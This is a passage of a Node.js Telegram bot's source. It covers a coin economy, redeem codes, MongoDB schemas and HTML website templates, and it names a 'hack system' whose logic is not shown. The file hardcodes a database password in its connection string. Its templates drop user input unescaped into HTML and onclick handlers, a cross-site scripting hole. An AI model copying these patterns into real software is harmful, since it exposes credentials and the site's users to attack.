// =====================================================
// 🎮🔥 SLIME TRACKERX v22.0 - ULTIMATE GOD EDITION 🔥🎮
// 🌐 WEB CREATOR (15 COINS!) | 1v1 WORD BATTLE | HACK SYSTEM
// 🎲 CASINO | TOURNAMENTS | DAILY QUESTS | SHOP | LOTTERY
// 💀 FULLY INTERACTIVE | NO ERRORS | MENU WORKS! 💀
// =====================================================
// 👑 Dev: @Mrddev | 📢 Updates: @devxtechzone
// 🏆 CHALLENGE FRIENDS | CREATE WEBSITES | EARN COINS
// 🎁 NEW: CASINO GAMES | TOURNAMENTS | DAILY QUESTS
// =====================================================

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");
const mongoose = require("mongoose");
const fs = require("fs-extra");
const archiver = require("archiver");
const multer = require("multer");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ========== FILE UPLOAD SETUP ==========
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'uploads/')
  },
  filename: function (req, file, cb) {
    cb(null, Date.now() + '-' + file.originalname)
  }
});
const upload = multer({ storage: storage, limits: { fileSize: 10 * 1024 * 1024 } });

// ========== SETUP ==========
app.use(bodyParser.json({ limit: "100mb" }));
app.use(express.static(path.join(__dirname, "public")));
app.use("/websites", express.static(path.join(__dirname, "websites")));
app.use("/uploads", express.static(path.join(__dirname, "uploads")));

fs.ensureDirSync(path.join(__dirname, "websites"));
fs.ensureDirSync(path.join(__dirname, "uploads"));
fs.ensureDirSync(path.join(__dirname, "public"));

// ========== MONGODB CONNECTION ==========
const MONGODB_URI = "mongodb+srv://mrdev:dev091339@cluster0.grjlq7v.mongodb.net/trackerx?retryWrites=true&w=majority";

mongoose.connect(MONGODB_URI)
  .then(() => console.log('✅ MongoDB Connected!'))
  .catch(err => console.log('❌ MongoDB Error:', err));

// ========== ENHANCED SCHEMAS ==========
const userSchema = new mongoose.Schema({
  userId: { type: Number, unique: true, required: true },
  joinDate: { type: Date, default: Date.now },
  lastActive: Date,
  coins: { type: Number, default: 15 },
  diamonds: { type: Number, default: 0 },
  totalEarned: { type: Number, default: 15 },
  totalSpent: { type: Number, default: 0 },
  referrals: { type: Number, default: 0 },
  referrer: { type: Number, default: null },
  hacks: { type: Number, default: 0 },
  hackedUsers: { type: [Number], default: [] },
  level: { type: Number, default: 1 },
  xp: { type: Number, default: 0 },
  streak: { type: Number, default: 0 },
  lastDaily: Date,
  games: { type: Number, default: 0 },
  wins: { type: Number, default: 0 },
  losses: { type: Number, default: 0 },
  badges: { type: [String], default: ["🎁 Newbie"] },
  wordWins: { type: Number, default: 0 },
  wordLosses: { type: Number, default: 0 },
  totalEarnedFromWords: { type: Number, default: 0 },
  websites: { type: [Object], default: [] },
  isAdmin: { type: Boolean, default: false },
  welcomeGif: { type: String, default: null },
  casinoWins: { type: Number, default: 0 },
  tournamentWins: { type: Number, default: 0 },
  lotteryTickets: { type: Number, default: 0 },
  dailyQuests: { type: Object, default: {} }
});

const codeSchema = new mongoose.Schema({
  code: { type: String, unique: true, required: true },
  coins: Number,
  diamonds: { type: Number, default: 0 },
  usedBy: [Number],
  maxUses: { type: Number, default: 20 },
  left: Number,
  expire: Date,
  createdAt: { type: Date, default: Date.now }
});

const websiteSchema = new mongoose.Schema({
  name: String,
  ownerId: Number,
  template: String,
  content: Object,
  images: [String],
  url: String,
  views: { type: Number, default: 0 },
  likes: { type: Number, default: 0 },
  createdAt: { type: Date, default: Date.now }
});

const tournamentSchema = new mongoose.Schema({
  id: String,
  name: String,
  entryFee: Number,
  prizePool: Number,
  players: [Number],
  winner: { type: Number, default: null },
  status: { type: String, default: "waiting" },
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);
const Code = mongoose.model('Code', codeSchema);
const Website = mongoose.model('Website', websiteSchema);
const Tournament = mongoose.model('Tournament', tournamentSchema);

// ========== CONFIG ==========
const DOMAIN = process.env.DOMAIN || "https://virtualnumbersfree.onrender.com";
const CHANNEL = process.env.CHANNEL || "@devxtechzone";
const OWNER_ID = parseInt(process.env.OWNER_ID) || 6170894121;

// ========== ECONOMY ==========
const TRACK_COST = 10;
const NEW_COINS = 15;
const REF_REWARD = 10;
const DAILY_REWARD = 5;
const WORK_REWARD = 2;
const WORK_CD = 12 * 60 * 60 * 1000;
const WORD_MIN_BET = 5;
const WORD_MAX_BET = 500;
const WEB_PRICE = 15;

// ========== DIFFICULTY LEVELS ==========
const difficultyLevels = {
  "easy": { name: "🍃 EASY", timer: 45, multiplier: 0.8, color: "🟢", letters: "3-4" },
  "medium": { name: "⚡ MEDIUM", timer: 30, multiplier: 1.0, color: "🟡", letters: "5-6" },
  "hard": { name: "🔥 HARD", timer: 15, multiplier: 1.5, color: "🟠", letters: "7-8" },
  "expert": { name: "💀 EXPERT", timer: 8, multiplier: 2.0, color: "🔴", letters: "9+" }
};

// ========== COMPLETE WORD DATABASE ==========
const wordsByLength = {
  3: ["CAT", "DOG", "SUN", "CAR", "BAG", "HAT", "LEG", "EYE", "CUP", "BED", "RED", "HOT", "COLD", "BIG", "NEW", "OLD", "GOOD", "BAD", "FUN", "RUN", "SIT", "WALK", "EAT", "FLY", "CRY", "JOY", "SAD", "WET", "DRY", "FAT", "THIN", "RICH", "POOR", "HIGH", "LOW", "FAR", "NEAR", "DARK", "LIGHT", "SOFT", "HARD"],
  4: ["FISH", "BIRD", "FROG", "STAR", "MOON", "TREE", "HOUSE", "APPLE", "MANGO", "HAPPY", "SMART", "BRAIN", "HEART", "SOUND", "LIGHT", "DARK", "BLACK", "WHITE", "GREEN", "BLUE", "PINK", "BROWN", "WATER", "FIRE", "EARTH", "WIND", "CLOUD", "STORM", "RAIN", "SNOW", "MONEY", "POWER", "TRUTH", "PEACE", "WORLD", "PEOPLE", "HUMAN", "ANIMAL", "PLANT", "RIVER"],
  5: ["APPLE", "MANGO", "GRAPE", "BERRY", "PEACH", "LEMON", "MELON", "HOUSE", "HAPPY", "SMART", "BRAIN", "HEART", "SOUND", "LIGHT", "DARK", "BLACK", "WHITE", "GREEN", "YELLOW", "PURPLE", "ORANGE", "CLOUD", "STORM", "MONEY", "POWER", "TRUTH", "PEACE", "WORLD", "PEOPLE", "HUMAN", "ANIMAL", "PLANT", "FLOWER", "FOREST", "RIVER", "MOUNTAIN", "OCEAN", "DESERT", "JUNGLE", "ISLAND", "BEACH", "SUNSET", "SUNRISE", "GARDEN", "PALACE", "CASTLE"],
  6: ["BANANA", "ORANGE", "PURPLE", "YELLOW", "SILVER", "GOLDEN", "RABBIT", "TIGER", "EAGLE", "SHARK", "WHALE", "ZEBRA", "SNAKE", "WOLF", "BEAR", "FOX", "LION", "MOUSE", "HORSE", "COW", "SHEEP", "GOAT", "CHICKEN", "DUCK", "TURKEY", "PIGEON", "CROW", "SPARROW", "BUTTER", "CHEESE", "BREAD", "SUGAR", "SALT", "PEPPER", "HONEY", "MILK", "COFFEE", "TEA", "JUICE", "WATER", "GARDEN", "PALACE", "CASTLE", "DRAGON", "PHOENIX", "WIZARD", "MAGIC"],
  7: ["BANANA", "ORANGE", "PURPLE", "YELLOW", "SILVER", "GOLDEN", "RABBIT", "TIGER", "EAGLE", "SHARK", "WHALE", "ZEBRA", "SNAKE", "WOLF", "BEAR", "FOX", "LION", "MOUSE", "HORSE", "COW", "SHEEP", "GOAT", "CHICKEN", "DUCK", "TURKEY", "PIGEON", "CROW", "SPARROW", "BUTTER", "CHEESE", "BREAD", "SUGAR", "SALT", "PEPPER", "HONEY", "MILK", "COFFEE", "TEA", "JUICE", "WATER", "GARDEN", "PALACE", "CASTLE", "DRAGON", "PHOENIX", "WIZARD", "MAGIC"],
  8: ["ELEPHANT", "GIRAFFE", "KANGAROO", "DOLPHIN", "PENGUIN", "BUTTERFLY", "DRAGON", "PHOENIX", "COMPUTER", "KEYBOARD", "MONITOR", "PRINTER", "SCANNER", "ROUTER", "BEAUTIFUL", "WONDERFUL", "EXCITING", "ADVENTURE", "MYSTERY", "JOURNEY", "DISCOVER", "EXPLORE", "CHALLENGE", "VICTORY", "STRENGTH", "COURAGE", "FRIENDSHIP", "HAPPINESS", "MAGNIFICENT"],
  9: ["EXTRAORDINARY", "UNBELIEVABLE", "INCREDIBLE", "RESPONSIBILITY", "CHARACTERISTIC", "UNDERSTANDING", "ACCOMMODATION", "RECOMMENDATION", "INTERNATIONAL", "ENTREPRENEUR", "CONGRATULATIONS", "IDENTIFICATION", "MISUNDERSTANDING", "UNPREDICTABLE", "IMPROVISATION", "MAGNIFICENT", "PHENOMENON", "SIMULTANEOUSLY", "UNCONSCIOUSLY", "COUNTERPRODUCTIVE"]
};

function getRandomWordByLength(length) {
  let words = wordsByLength[length] || wordsByLength[5];
  return words[Math.floor(Math.random() * words.length)];
}

// ========== MEMORY CACHE ==========
let usersCache = new Map();
let codesCache = new Map();
let tokens = new Map();
let workCD = new Map();
let tagCD = new Map();
let warns = new Map();
let antiLink = new Set();
let antiSpam = new Set();
let spamTrack = new Map();
let welcome = new Map();
let goodbye = new Map();
let bannedUsers = new Set();
let activeChats = new Map();
let gameSessions = new Map();
let afk = new Map();
let notes = new Map();
let processedMessages = new Set();
let wordChallenges = new Map();
let webBuilds = new Map();
let activeTournaments = new Map();
let lotteryPool = 0;
let lotteryEntries = [];

// ========== LOAD DATA ==========
async function loadData() {
  try {
    const allUsers = await User.find({});
    for (const user of allUsers) {
      usersCache.set(user.userId, user);
    }
    console.log(`📂 Loaded ${usersCache.size} users`);
    
    const allCodes = await Code.find({ expire: { $gt: new Date() } });
    for (const code of allCodes) {
      codesCache.set(code.code, code);
    }
    console.log(`📂 Loaded ${codesCache.size} active codes`);
    
    const activeTours = await Tournament.find({ status: "waiting" });
    for (const tour of activeTours) {
      activeTournaments.set(tour.id, tour);
    }
  } catch(e) {
    console.log("Error loading data:", e);
  }
}

async function saveUser(userId, data) {
  try {
    await User.findOneAndUpdate({ userId: userId }, data, { upsert: true });
    usersCache.set(userId, data);
  } catch(e) {
    console.log("Error saving user:", e);
  }
}

async function initUser(userId, referrerId = null) {
  let user = usersCache.get(userId);
  
  if (!user) {
    user = {
      userId: userId,
      joinDate: new Date(),
      lastActive: new Date(),
      coins: NEW_COINS,
      diamonds: 0,
      totalEarned: NEW_COINS,
      totalSpent: 0,
      referrals: 0,
      referrer: referrerId,
      hacks: 0,
      hackedUsers: [],
      level: 1,
      xp: 0,
      streak: 0,
      lastDaily: null,
      games: 0,
      wins: 0,
      losses: 0,
      badges: ["🎁 Newbie"],
      wordWins: 0,
      wordLosses: 0,
      totalEarnedFromWords: 0,
      websites: [],
      isAdmin: userId === OWNER_ID,
      welcomeGif: null,
      casinoWins: 0,
      tournamentWins: 0,
      lotteryTickets: 0,
      dailyQuests: {}
    };
    await saveUser(userId, user);
    
    if (referrerId && referrerId !== userId) {
      let referrer = usersCache.get(referrerId);
      if (referrer) {
        referrer.coins += REF_REWARD;
        referrer.referrals += 1;
        referrer.totalEarned += REF_REWARD;
        if (!referrer.badges.includes("🌟 Recruiter")) {
          referrer.badges.push("🌟 Recruiter");
        }
        await saveUser(referrerId, referrer);
        bot.telegram.sendMessage(referrerId, `🎉 NEW REFERRAL! +${REF_REWARD} COINS\n💰 ${referrer.coins} coins | 👥 ${referrer.referrals} refs`);
      }
    }
  }
  return user;
}

async function addCoin(userId, amt) {
  let user = usersCache.get(userId);
  if (user) {
    user.coins += amt;
    user.totalEarned += amt;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function takeCoin(userId, amt) {
  let user = usersCache.get(userId);
  if (user && user.coins >= amt) {
    user.coins -= amt;
    user.totalSpent += amt;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function canHack(userId) {
  let user = usersCache.get(userId);
  return user && user.coins >= TRACK_COST;
}

async function useHack(userId) {
  let user = usersCache.get(userId);
  if (user && user.coins >= TRACK_COST) {
    user.coins -= TRACK_COST;
    user.hacks += 1;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function addXP(userId, amount) {
  let user = usersCache.get(userId);
  if (user) {
    user.xp += amount;
    let needed = user.level * 100;
    if (user.xp >= needed) {
      user.xp -= needed;
      user.level += 1;
      let reward = user.level * 5;
      user.coins += reward;
      await saveUser(userId, user);
      bot.telegram.sendMessage(userId, `🎉 LEVEL UP! Level ${user.level}! +${reward} COINS`);
    } else {
      await saveUser(userId, user);
    }
    return true;
  }
  return false;
}

async function getUsername(userId) {
  try {
    let chat = await bot.telegram.getChat(userId);
    return chat.username || `User_${userId}`;
  } catch {
    return `User_${userId}`;
  }
}

function refLink(id) {
  return `https://t.me/${bot.botInfo?.username || 'trackersxbot'}?start=ref_${id}`;
}

async function checkJoin(ctx) {
  try {
    let m = await ctx.telegram.getChatMember(CHANNEL, ctx.from.id);
    return ["creator", "administrator", "member"].includes(m.status);
  } catch {
    return false;
  }
}

// ========== REDEEM CODE SYSTEM ==========
async function genCode(coins, diamonds = 0, uses = 20, hours = 24) {
  let code = crypto.randomBytes(6).toString("hex").toUpperCase();
  let expire = new Date(Date.now() + (hours * 3600000));
  
  let codeData = new Code({
    code: code,
    coins: coins,
    diamonds: diamonds,
    usedBy: [],
    maxUses: Math.min(uses, 20),
    left: Math.min(uses, 20),
    expire: expire
  });
  
  await codeData.save();
  codesCache.set(code, codeData);
  return code;
}

async function redeemCode(userId, code) {
  try {
    let c = codesCache.get(code.toUpperCase());
    
    if (!c) {
      c = await Code.findOne({ code: code.toUpperCase(), expire: { $gt: new Date() } });
      if (!c) return { ok: false, msg: "❌ Invalid code!" };
    }
    
    if (Date.now() > c.expire) {
      codesCache.delete(code);
      return { ok: false, msg: "❌ Code expired!" };
    }
    
    if (c.left <= 0) {
      return { ok: false, msg: "❌ Code already used up!" };
    }
    
    if (c.usedBy.includes(userId)) {
      return { ok: false, msg: "❌ You already used this code!" };
    }
    
    await addCoin(userId, c.coins);
    if (c.diamonds > 0) {
      let user = usersCache.get(userId);
      user.diamonds += c.diamonds;
      await saveUser(userId, user);
    }
    
    c.usedBy.push(userId);
    c.left -= 1;
    await c.save();
    codesCache.set(c.code, c);
    
    let user = usersCache.get(userId);
    return { ok: true, msg: `✅ Redeemed ${c.coins} coins!${c.diamonds > 0 ? ` +${c.diamonds}💎` : ''}`, coins: c.coins, newBalance: user.coins };
    
  } catch(e) {
    console.error("Redeem error:", e);
    return { ok: false, msg: "❌ Error redeeming code!" };
  }
}

// ========== ADMIN GIF SETUP ==========
bot.command("setwelcomegif", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.isAdmin && ctx.from.id !== OWNER_ID) return ctx.reply("❌ Admin only!");
  
  if (ctx.message.reply_to_message && ctx.message.reply_to_message.animation) {
    const gifId = ctx.message.reply_to_message.animation.file_id;
    user.welcomeGif = gifId;
    await saveUser(ctx.from.id, user);
    await ctx.reply(`✅ **Welcome GIF set!**\n\nGIF ID saved!\nNew users will see this GIF!`);
  } else {
    await ctx.reply("🎥 **How to set welcome GIF:**\n\n1. Send a GIF to this chat\n2. Reply to that GIF with `/setwelcomegif`\n3. Done!");
  }
});

bot.command("removewelcomegif", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.isAdmin && ctx.from.id !== OWNER_ID) return ctx.reply("❌ Admin only!");
  
  user.welcomeGif = null;
  await saveUser(ctx.from.id, user);
  await ctx.reply("✅ **Welcome GIF removed!**");
});

// ========== DOPER HTML TEMPLATES ==========
const htmlTemplates = {
  portfolio: (data) => `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${data.name || 'Portfolio'} | 🔥 SLIME TRACKERX</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #0a0a0a; color: #fff; overflow-x: hidden; }
        .gradient-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%); z-index: -2; opacity: 0.1; }
        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
        
        /* Navbar */
        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; flex-wrap: wrap; gap: 20px; }
        .logo { font-size: 28px; font-weight: 800; background: linear-gradient(135deg, #667eea, #764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .nav-links { display: flex; gap: 30px; }
        .nav-links a { color: #fff; text-decoration: none; transition: 0.3s; }
        .nav-links a:hover { color: #667eea; }
        
        /* Hero Section */
        .hero { min-height: 90vh; display: flex; align-items: center; justify-content: center; text-align: center; }
        .hero h1 { font-size: 4rem; margin-bottom: 20px; background: linear-gradient(135deg, #fff, #a8c0ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: fadeInUp 0.8s ease; }
        .hero p { font-size: 1.2rem; opacity: 0.9; margin-bottom: 30px; animation: fadeInUp 1s ease; }
        .btn { display: inline-block; padding: 12px 35px; background: linear-gradient(135deg, #667eea, #764ba2); border: none; border-radius: 30px; color: white; font-weight: 600; text-decoration: none; transition: transform 0.3s, box-shadow 0.3s; animation: fadeInUp 1.2s ease; }
        .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4); }
        
        /* Sections */
        .section { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 40px; margin: 40px 0; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); transition: transform 0.3s; }
        .section:hover { transform: translateY(-5px); }
        .section h2 { font-size: 2rem; margin-bottom: 30px; background: linear-gradient(135deg, #fff, #a8c0ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        
        /* Skills */
        .skills { display: flex; flex-wrap: wrap; gap: 15px; margin-top: 20px; }
        .skill { background: linear-gradient(135deg, rgba(102,126,234,0.2), rgba(118,75,162,0.2)); padding: 10px 25px; border-radius: 30px; font-weight: 500; border: 1px solid rgba(102,126,234,0.3); }
        
        /* Projects Grid */
        .projects { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 25px; margin-top: 30px; }
        .project { background: rgba(255,255,255,0.05); border-radius: 15px; padding: 25px; transition: all 0.3s; border: 1px solid rgba(255,255,255,0.1); }
        .project:hover { transform: translateY(-5px); background: rgba(255,255,255,0.1); border-color: #667eea; }
        .project h3 { margin-bottom: 10px; color: #a8c0ff; }
        
        /* Footer */
        footer { text-align: center; padding: 40px; margin-top: 60px; border-top: 1px solid rgba(255,255,255,0.1); }
        
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @media (max-width: 768px) {
            .navbar { flex-direction: column; text-align: center; }
            .hero h1 { font-size: 2rem; }
            .projects { grid-template-columns: 1fr; }
            .section { padding: 20px; }
        }
    </style>
</head>
<body>
    <div class="gradient-bg"></div>
    <div class="container">
        <div class="navbar">
            <div class="logo">✨ ${data.name || 'Portfolio'}</div>
            <div class="nav-links">
                <a href="#home">Home</a>
                <a href="#about">About</a>
                <a href="#projects">Projects</a>
                <a href="#contact">Contact</a>
            </div>
        </div>
        
        <div class="hero" id="home">
            <div>
                <h1>${data.name || 'Welcome'}</h1>
                <p>${data.title || 'Creative Developer & Designer'}</p>
                <a href="#contact" class="btn">📧 Contact Me</a>
            </div>
        </div>
        
        <div class="section" id="about">
            <h2>✨ About Me</h2>
            <p>${data.bio || 'Passionate creator dedicated to building amazing digital experiences.'}</p>
            <div class="skills">
                <span class="skill">${data.skill1 || 'UI/UX Design'}</span>
                <span class="skill">${data.skill2 || 'Web Development'}</span>
                <span class="skill">${data.skill3 || 'Mobile Apps'}</span>
            </div>
        </div>
        
        <div class="section" id="projects">
            <h2>🚀 Featured Work</h2>
            <div class="projects">
                <div class="project">
                    <h3>${data.project1 || 'Project Alpha'}</h3>
                    <p>${data.project1_desc || 'An innovative solution for modern problems.'}</p>
                </div>
                <div class="project">
                    <h3>${data.project2 || 'Project Beta'}</h3>
                    <p>${data.project2_desc || 'Pushing boundaries with cutting-edge tech.'}</p>
                </div>
            </div>
        </div>
        
        <div class="section" id="contact">
            <h2>📬 Get In Touch</h2>
            <p>📧 ${data.email || 'hello@example.com'}</p>
            <p>💼 Open for opportunities!</p>
            <a href="mailto:${data.email || 'hello@example.com'}" class="btn" style="margin-top: 20px;">Send Message →</a>
        </div>
        
        <footer>
            <p>© 2024 ${data.name || 'Portfolio'} | Built with 🔥 by SLIME TRACKERX</p>
        </footer>
    </div>
</body>
</html>`,
  
  business: (data) => `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${data.company || 'Business'} | 🏢 SLIME TRACKERX</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #f8f9fa; color: #1a1a2e; }
        
        /* Navbar */
        .navbar { background: #1a1a2e; color: white; padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; position: sticky; top: 0; z-index: 1000; }
        .logo { font-size: 28px; font-weight: 800; background: linear-gradient(135deg, #667eea, #764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .nav-links { display: flex; gap: 30px; }
        .nav-links a { color: white; text-decoration: none; transition: 0.3s; }
        .nav-links a:hover { color: #667eea; }
        
        /* Hero */
        .hero { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-align: center; padding: 120px 20px; }
        .hero h1 { font-size: 3.5rem; margin-bottom: 20px; animation: fadeInUp 0.8s ease; }
        .hero p { font-size: 1.2rem; opacity: 0.9; margin-bottom: 30px; animation: fadeInUp 1s ease; }
        .btn { background: white; color: #667eea; padding: 15px 40px; border-radius: 30px; text-decoration: none; font-weight: 700; display: inline-block; transition: transform 0.3s, box-shadow 0.3s; animation: fadeInUp 1.2s ease; }
        .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
        
        /* Container */
        .container { max-width: 1200px; margin: 0 auto; padding: 60px 20px; }
        
        /* Services */
        .services { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 30px; margin: 40px 0; }
        .service { background: white; border-radius: 15px; padding: 30px; text-align: center; transition: transform 0.3s, box-shadow 0.3s; box-shadow: 0 5px 20px rgba(0,0,0,0.1); }
        .service:hover { transform: translateY(-10px); box-shadow: 0 15px 40px rgba(102,126,234,0.2); }
        .service i { font-size: 3rem; background: linear-gradient(135deg, #667eea, #764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 20px; }
        .service h3 { margin-bottom: 15px; color: #1a1a2e; }
        .service p { color: #666; }
        
        /* Contact Section */
        .contact-section { background: #1a1a2e; color: white; text-align: center; padding: 80px 20px; margin-top: 60px; }
        .contact-section h2 { margin-bottom: 30px; }
        .contact-info { display: flex; justify-content: center; gap: 40px; flex-wrap: wrap; margin-top: 30px; }
        .contact-info p { display: flex; align-items: center; gap: 10px; }
        
        footer { text-align: center; padding: 30px; background: #0f0f1a; color: white; }
        
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @media (max-width: 768px) {
            .navbar { flex-direction: column; gap: 15px; text-align: center; }
            .hero h1 { font-size: 2rem; }
            .services { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="navbar">
        <div class="logo">🏢 ${data.company || 'Business'}</div>
        <div class="nav-links">
            <a href="#home">Home</a>
            <a href="#services">Services</a>
            <a href="#contact">Contact</a>
        </div>
    </div>
    
    <div class="hero" id="home">
        <h1>${data.company || 'Welcome to Our Company'}</h1>
        <p>${data.tagline || 'Excellence in Every Service'}</p>
        <a href="#contact" class="btn">Get Started →</a>
    </div>
    
    <div class="container" id="services">
        <h2 style="text-align:center; margin-bottom: 20px;">💼 Our Premium Services</h2>
        <p style="text-align:center; color:#666; margin-bottom: 40px;">Delivering excellence with passion and precision</p>
        <div class="services">
            <div class="service">
                <i class="fas fa-rocket"></i>
                <h3>${data.service1 || 'Innovation'}</h3>
                <p>${data.service1_desc || 'Cutting-edge solutions for modern challenges.'}</p>
            </div>
            <div class="service">
                <i class="fas fa-chart-line"></i>
                <h3>${data.service2 || 'Growth'}</h3>
                <p>${data.service2_desc || 'Strategic planning for sustainable success.'}</p>
            </div>
            <div class="service">
                <i class="fas fa-headset"></i>
                <h3>${data.service3 || 'Support'}</h3>
                <p>${data.service3_desc || '24/7 dedicated customer support.'}</p>
            </div>
        </div>
    </div>
    
    <div class="contact-section" id="contact">
        <h2>📞 Connect With Us</h2>
        <div class="contact-info">
            <p><i class="fas fa-envelope"></i> ${data.email || 'info@example.com'}</p>
            <p><i class="fas fa-phone"></i> ${data.phone || '+1 234 567 8900'}</p>
            <p><i class="fas fa-map-marker-alt"></i> ${data.address || '123 Business Street'}</p>
        </div>
        <a href="mailto:${data.email || 'info@example.com'}" class="btn" style="margin-top: 30px; background: white;">Send Message</a>
    </div>
    
    <footer>
        <p>© 2024 ${data.company || 'Business'} | Built with 🔥 by SLIME TRACKERX</p>
    </footer>
</body>
</html>`,
  
  store: (data) => `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${data.store || 'Store'} | 🛍️ SLIME TRACKERX</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #f5f5f5; }
        
        .navbar { background: white; padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; }
        .logo { font-size: 28px; font-weight: 800; color: #667eea; }
        .cart-icon { font-size: 24px; cursor: pointer; transition: 0.3s; }
        .cart-icon:hover { transform: scale(1.1); }
        
        .hero { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-align: center; padding: 80px 20px; }
        .hero h1 { font-size: 3rem; margin-bottom: 20px; }
        
        .products { max-width: 1200px; margin: 60px auto; padding: 0 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 30px; }
        .product { background: white; border-radius: 15px; overflow: hidden; transition: transform 0.3s, box-shadow 0.3s; box-shadow: 0 5px 20px rgba(0,0,0,0.1); }
        .product:hover { transform: translateY(-10px); box-shadow: 0 15px 40px rgba(0,0,0,0.15); }
        .product-image { height: 200px; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; }
        .product-image i { font-size: 4rem; color: white; }
        .product-info { padding: 20px; }
        .product h3 { margin-bottom: 10px; color: #1a1a2e; }
        .price { font-size: 24px; font-weight: 800; color: #667eea; margin: 10px 0; }
        .buy-btn { background: linear-gradient(135deg, #667eea, #764ba2); color: white; border: none; padding: 12px 30px; border-radius: 25px; cursor: pointer; width: 100%; font-weight: 600; transition: 0.3s; }
        .buy-btn:hover { transform: scale(1.02); box-shadow: 0 5px 15px rgba(102,126,234,0.4); }
        
        footer { background: #1a1a2e; color: white; text-align: center; padding: 40px; margin-top: 60px; }
        
        @media (max-width: 768px) {
            .navbar { flex-direction: column; gap: 15px; text-align: center; }
            .hero h1 { font-size: 2rem; }
            .products { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="navbar">
        <div class="logo">🛒 ${data.store || 'Store'}</div>
        <div class="cart-icon" onclick="alert('Contact ${data.email || 'store@example.com'} to order!')">🛍️ Cart</div>
    </div>
    
    <div class="hero">
        <h1>${data.store || 'Welcome to Our Store'}</h1>
        <p>${data.tagline || 'Premium Quality Products'}</p>
    </div>
    
    <div class="products">
        <div class="product">
            <div class="product-image"><i class="fas fa-gem"></i></div>
            <div class="product-info">
                <h3>${data.product1 || 'Premium Product'}</h3>
                <div class="price">$${data.product1_price || '49'}</div>
                <p>${data.product1_desc || 'High quality premium product'}</p>
                <button class="buy-btn" onclick="alert('Contact ${data.email || ''} to purchase!')">Add to Cart</button>
            </div>
        </div>
        <div class="product">
            <div class="product-image"><i class="fas fa-star"></i></div>
            <div class="product-info">
                <h3>${data.product2 || 'Featured Item'}</h3>
                <div class="price">$${data.product2_price || '79'}</div>
                <p>${data.product2_desc || 'Best selling item'}</p>
                <button class="buy-btn" onclick="alert('Contact ${data.email || ''} to purchase!')">Add to Cart</button>
            </div>
        </div>
        <div class="product">
            <div class="product-image"><i class="fas fa-crown"></i></div>
            <div class="product-info">
                <h3>${data.product3 || 'Deluxe Edition'}</h3>
                <div class="price">$${data.product3_price || '99'}</div>
                <p>${data.product3_desc || 'Limited edition item'}</p>
                <button class="buy-btn" onclick="alert('Contact ${data.email || ''} to purchase!')">Add to Cart</button>
            </div>
        </div>
    </div>
    
    <footer>
        <p>📧 ${data.email || 'store@example.com'}</p>
        <p>🚚 Free shipping on orders over $100</p>
        <p>🔥 Built with SLIME TRACKERX</p>
    </footer>
</body>
</html>`,
  
